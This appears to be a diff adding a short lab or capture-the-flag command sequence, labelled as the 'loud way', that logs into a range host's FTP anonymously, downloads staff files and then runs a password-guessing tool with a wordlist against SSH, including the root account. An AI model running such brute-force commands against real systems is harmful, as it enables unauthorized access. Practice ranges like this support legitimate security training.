@@ -1,0 +1,10 @@
+## the LOUD way: grab every file, then guess passwords instead of reading the note
+ftp 10.10.11.20
+anonymous
+guest
+cd pub
+get welcome.txt
+get new-staff.txt
+bye
+pwguess -l {{USER}} -P /usr/share/wordlists/range-common.txt ssh://10.10.11.20
+pwguess -l root -P /usr/share/wordlists/range-common.txt ssh://10.10.11.20
